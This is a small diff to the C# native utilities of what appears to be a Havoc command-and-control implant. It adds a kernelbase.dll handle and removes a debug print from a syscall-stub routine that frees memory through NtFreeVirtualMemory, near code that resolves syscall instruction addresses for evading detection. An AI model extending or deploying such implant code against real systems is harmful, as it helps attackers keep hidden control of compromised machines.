@@ -16,7 +16,7 @@ namespace HavocImplant.NativeUtils
         public static dll kernel32 = new dll("kernel32.dll");
         public static dll win32u = new dll("win32u.dll");
         public static dll user32 = new dll("user32.dll");
-
+        public static dll kernelbase = new dll("kernelbase.dll");
     }
     public class dll
     {
@@ -364,9 +364,6 @@ namespace HavocImplant.NativeUtils
             object[] freeArgs = new object[] { (IntPtr)(-1), stubLoc, (IntPtr)21, (uint)0x8000 };
             Marshal.GetDelegateForFunctionPointer(free, typeof(Delegates.NtFreeVirtualMemory)).DynamicInvoke(freeArgs);
 
-#if debug
-            Console.WriteLine($"Executed {name}");
-#endif
             return retValue;
         }
         public void getSyscallInstructionAddresses()
